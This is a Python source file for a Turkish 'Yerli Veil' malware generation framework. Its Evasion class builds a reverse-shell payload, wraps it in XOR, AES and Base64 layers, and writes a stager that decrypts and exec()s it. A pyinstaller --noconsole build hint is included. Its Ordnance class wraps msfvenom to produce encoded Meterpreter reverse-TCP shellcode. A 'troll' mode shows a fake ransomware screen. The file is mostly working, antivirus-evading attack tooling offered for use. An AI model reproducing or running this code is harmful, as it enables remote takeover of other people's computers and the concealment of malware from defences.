#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# ============================================================
#  YERLI VEIL FRAMEWORK v1.0  -  github.com/memetcanwq31
#  MALWARE GENERATION SUITE  (Evasion + Ordnance birleşik)
# ============================================================

import os
import sys
import shutil
import random
import string
import hashlib
import base64
import subprocess
import importlib
import argparse
from datetime import datetime

sys.dont_write_bytecode = True

# ---------- kütüphane kontrolleri ----------
try:
    from Crypto.Cipher import AES
    from Crypto.Random import get_random_bytes
    from Crypto.Util.Padding import pad, unpad
    HAS_CRYPTO = True
except ImportError:
    HAS_CRYPTO = False

try:
    from colorama import Fore, Style, init
    init(autoreset=True)
    C, S = Fore, Style.RESET_ALL
except ImportError:
    class _C:
        def __getattr__(self, n): return ""
    C, S = _C(), ""

VERSION = "1.0"
OUTPUT_DIR = os.path.join(os.path.dirname(os.path.realpath(__file__)), "output")

# ============================================================
#  HELPERS
# ============================================================
def random_string(n=8):
    return "".join(random.choices(string.ascii_lowercase, k=n))

def timestamp():
    return datetime.now().strftime("%Y%m%d_%H%M%S")

def ensure_output():
    os.makedirs(OUTPUT_DIR, exist_ok=True)
    return OUTPUT_DIR

def write_file(path, content, binary=False):
    os.makedirs(os.path.dirname(path), exist_ok=True)
    with open(path, "wb" if binary else "w") as f:
        f.write(content)
    return path

def sha256_file(path):
    h = hashlib.sha256()
    with open(path, "rb") as f:
        for chunk in iter(lambda: f.read(65536), b""):
            h.update(chunk)
    return h.hexdigest()

def xor_bytes(data: bytes, key: bytes) -> bytes:
    return bytes(b ^ key[i % len(key)] for i, b in enumerate(data))

def clean_payloads():
    d = ensure_output()
    for f in os.listdir(d):
        p = os.path.join(d, f)
        shutil.rmtree(p) if os.path.isdir(p) else os.remove(p)
    print(f"{C.GREEN}[+] Output dizini temizlendi: {d}")

# ============================================================
#  BANNER
# ============================================================
BANNER = rf"""{C.RED}=====================================================
{C.GREEN}   ______  _____  ____   _    _  ___   _____  _   _
{C.GREEN}  |  _   \|_   _|/ __ \ | |  | ||_  | |  __ \| | | |
{C.GREEN}  | |_)  |  | | | /  \ \| |__| |  | | | |__) | | | |
{C.GREEN}  |  _  <   | | | |  | ||  __  |  | | |  ___/| | | |
{C.GREEN}  | |_)  | _| |_| \__/ /| |  | | _| |_| |    | |_|
{C.GREEN}  |______/ |_____| \____/ |_|  |_|_____|_|     \___/
{C.RED}        YERLI VEIL FRAMEWORK v{VERSION}
{C.RED}        MALWARE GENERATION SUITE
{C.RED}        github.com/memetcanwq31
{C.RED}====================================================={S}"""

def title_screen():
    os.system("cls" if os.name == "nt" else "clear")
    print(BANNER)

# ============================================================
#  EVASION ENGINE
# ============================================================
class Evasion:
    """AES-256-CBC + XOR + Base64 katmanlı stager üretici."""

    def generate(self, lhost, lport, key=None, output_name=None):
        if not HAS_CRYPTO:
            print(f"{C.RED}[!] pycryptodome gerekli: pip install pycryptodome")
            return None
        aes_key = key if key else get_random_bytes(32).hex()
        aes_key = hashlib.sha256(aes_key.encode()).hexdigest()  # 64 hex = 32 byte
        xor_key = get_random_bytes(16)

        stage2 = f'''import socket, subprocess, os
s = socket.socket(); s.connect(("{lhost}", {lport}))
os.dup2(s.fileno(), 0); os.dup2(s.fileno(), 1); os.dup2(s.fileno(), 2)
subprocess.call(["cmd"] if os.name == "nt" else ["/bin/sh", "-i"])
'''
        xored = xor_bytes(stage2.encode(), xor_key)
        cipher = AES.new(bytes.fromhex(aes_key), AES.MODE_CBC)
        blob = base64.b64encode(
            cipher.iv + xor_key + cipher.encrypt(pad(xored, AES.block_size))
        ).decode()

        stager = f'''#!/usr/bin/env python3
# Yerli Veil stager -> {lhost}:{lport} | uretim: {timestamp()}
import base64
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad

KEY = bytes.fromhex("{aes_key}")
BLOB = "{blob}"

def run():
    raw = base64.b64decode(BLOB)
    iv, xk, ct = raw[:16], raw[16:32], raw[32:]
    pt = unpad(AES.new(KEY, AES.MODE_CBC, iv).decrypt(ct), AES.block_size)
    pt = bytes(b ^ xk[i % len(xk)] for i, b in enumerate(pt))
    exec(pt.decode())

if __name__ == "__main__":
    run()
'''
        out = os.path.join(ensure_output(), (output_name or "payload_" + random_string()) + ".py")
        write_file(out, stager)
        print(f"{C.GREEN}[+] Stager   : {out}")
        print(f"{C.YELLOW}[*] Anahtar  : {aes_key}")
        print(f"{C.CYAN}[*] Derleme  : pyinstaller --onefile --noconsole {out}")
        print(f"{C.CYAN}[*] SHA256   : {sha256_file(out)}")
        return out

    def list_payloads(self):
        print(f"{C.CYAN}[*] Mevcut payload'lar:")
        print("    python/aes_xor_rev  - AES+XOR+Base64 katmanli reverse stager")

# ============================================================
#  ORDNANCE ENGINE (msfvenom wrapper + encoder)
# ============================================================
class Ordnance:
    ENCODERS = ["xor", "base64", "none"]

    def generate(self, payload, lhost, lport, encoder="none", extra=None, stats=False):
        if shutil.which("msfvenom") is None:
            print(f"{C.RED}[!] msfvenom yok — Kali: sudo apt install metasploit-framework")
            return None
        cmd = ["msfvenom", "-p", payload, f"LHOST={lhost}", f"LPORT={lport}",
               "-f", "raw", "-a", "x86", "--platform", "windows"]
        if extra:
            cmd += extra
        print(f"{C.YELLOW}[*] CMD: {' '.join(cmd)}")
        try:
            raw = subprocess.check_output(cmd, stderr=subprocess.DEVNULL)
        except subprocess.CalledProcessError as e:
            print(f"{C.RED}[!] msfvenom hata (kod {e.returncode})")
            return None

        if encoder == "xor":
            key = get_random_bytes(16) if HAS_CRYPTO else os.urandom(16)
            raw = xor_bytes(raw, key)
            print(f"{C.YELLOW}[*] XOR key: {key.hex()}")
        elif encoder == "base64":
            raw = base64.b64encode(raw)

        out = os.path.join(ensure_output(), f"shellcode_{random_string()}.bin")
        write_file(out, raw, binary=True)
        if stats:
            print(f"{C.CYAN}[*] Boyut : {len(raw)} bytes")
            print(f"{C.CYAN}[*] SHA256: {sha256_file(out)}")
            print(f"{C.CYAN}[*] İlk32b: {raw[:32].hex()}")
        print(f"{C.GREEN}[+] Shellcode: {out}")
        return out

# ============================================================
#  TROLL MODULE (3x ESC ile gizli çıkış)
# ============================================================
def troll_modulu():
    print(f"{C.RED}[🚨] Sahte virüs simülasyonu... (çıkış: 3x ESC)")
    time.sleep(1.5)
    import time as t
    esc = 0
    try:
        if os.name == "nt":
            import msvcrt
            while True:
                os.system("cls")
                print(f"{C.RED}#  ⚠️  WNCRY_RANSOMWARE_V4.0  ⚠️  #")
                print(f"{C.RED}#  TÜM DOSYALARINIZ ŞİFRELENDİ!  #")
                print(f"{C.YELLOW}[!] Dosyalar imha ediliyor... ERROR 0x{random.randint(1000,9999)}")
                t0 = t.time()
                while t.time() - t0 < 0.7:
                    if msvcrt.kbhit() and msvcrt.getch() == b"\x1b":
                        esc += 1
                        if esc >= 3:
                            raise KeyboardInterrupt
                    else:
                        esc = 0
        else:
            import tty, termios, select
            fd = sys.stdin.fileno()
            old = termios.tcgetattr(fd)
            tty.setraw(fd)
            try:
                while True:
                    os.system("clear")
                    print(f"{C.RED}#  ⚠️  WNCRY_RANSOMWARE_V4.0  ⚠️  #")
                    t0 = t.time()
                    while t.time() - t0 < 0.7:
                        r, _, _ = select.select([sys.stdin], [], [], 0.1)
                        if r and sys.stdin.read(1) == "\x1b":
                            esc += 1
                            if esc >= 3:
                                raise KeyboardInterrupt
                        else:
                            esc = 0
            finally:
                termios.tcsetattr(fd, termios.TCSADRAIN, old)
    except KeyboardInterrupt:
        os.system("cls" if os.name == "nt" else "clear")
        print(f"{C.GREEN}[✓] Şaka kapatıldı, sistem güvende kanka :)")
        t.sleep(2)

import time  # troll için

# ============================================================
#  MAIN MENU + CLI
# ============================================================
def main_menu():
    title_screen()
    ev, ordn = Evasion(), Ordnance()
    while True:
        print(f"\n{C.GREEN}  [1] Evasion   - Payload uretimi (AES+XOR+Base64 stager)")
        print(f"{C.GREEN}  [2] Ordnance  - Shellcode uretimi (msfvenom + encoder)")
        print(f"{C.GREEN}  [3] Troll     - Sahte virüs simülasyonu")
        print(f"{C.GREEN}  [4] Clean     - Output temizle")
        print(f"{C.GREEN}  [0] Exit")
        c = input(f"\n{C.RED}YerliVeil> {S}").strip()
        if c == "1":
            ev.list_payloads()
            lhost = input(f"{C.YELLOW}LHOST> {S}").strip() or "127.0.0.1"
            lport = input(f"{C.YELLOW}LPORT> {S}").strip() or "4444"
            ev.generate(lhost, lport)
        elif c == "2":
            print(f"{C.CYAN}[*] Encoder'lar: {', '.join(ordn.ENCODERS)}")
            p = input(f"{C.YELLOW}payload (windows/meterpreter/reverse_tcp)> {S}").strip() \
                or "windows/meterpreter/reverse_tcp"
            lhost = input(f"{C.YELLOW}LHOST> {S}").strip()
            lport = input(f"{C.YELLOW}LPORT> {S}").strip() or "4444"
            enc = input(f"{C.YELLOW}encoder (none)> {S}").strip() or "none"
            ordn.generate(p, lhost, lport, encoder=enc, stats=True)
        elif c == "3":
            troll_modulu()
        elif c == "4":
            clean_payloads()
        elif c == "0":
            print(f"{C.RED}Çıkılıyor...")
            sys.exit()
        else:
            print(f"{C.RED}[!] Geçersiz seçenek!")

def cli(args):
    title_screen()
    ev, ordn = Evasion(), Ordnance()
    opts = {}
    for kv in (args.c or []):
        if "=" in kv:
            k, v = kv.split("=", 1)
            opts[k.upper()] = v
    if args.list_payloads:
        ev.list_payloads()
        return
    if args.tool and args.tool.lower() == "evasion":
        ev.generate(opts.get("LHOST", "127.0.0.1"), opts.get("LPORT", "4444"),
                    key=opts.get("KEY"), output_name=args.o)
    elif args.tool and args.tool.lower() == "ordnance":
        ordn.generate(args.ordnance_payload, opts.get("LHOST", ""),
                      opts.get("LPORT", "4444"), encoder=args.encoder or "none",
                      stats=args.print_stats)
    else:
        main_menu()

if __name__ == "__main__":
    parser = argparse.ArgumentParser(add_help=False,
        description="Yerli Veil - Turkish native payload framework")
    parser.add_argument('-h', '-?', '--h', '-help', '--help',
                        action="store_true", help=argparse.SUPPRESS)
    parser.add_argument('-t', '--tool', metavar='TOOL', default=None,
                        help='Evasion veya Ordnance')
    parser.add_argument('-p', '--payload', default=None)
    parser.add_argument('-o', metavar="OUTPUT-NAME", default=None)
    parser.add_argument('-c', metavar='OPTION=value', nargs='*', default=[],
                        help='LHOST=x LPORT=y KEY=z')
    parser.add_argument('--list-payloads', action='store_true')
    parser.add_argument('--ordnance-payload', default='windows/meterpreter/reverse_tcp')
    parser.add_argument('-e', '--encoder', default=None)
    parser.add_argument('--print-stats', action='store_true')
    parser.add_argument('--clean', action='store_true')
    args = parser.parse_args()

    if args.h:
        parser.print_help()
    elif args.clean:
        clean_payloads()
    else:
        cli(args)
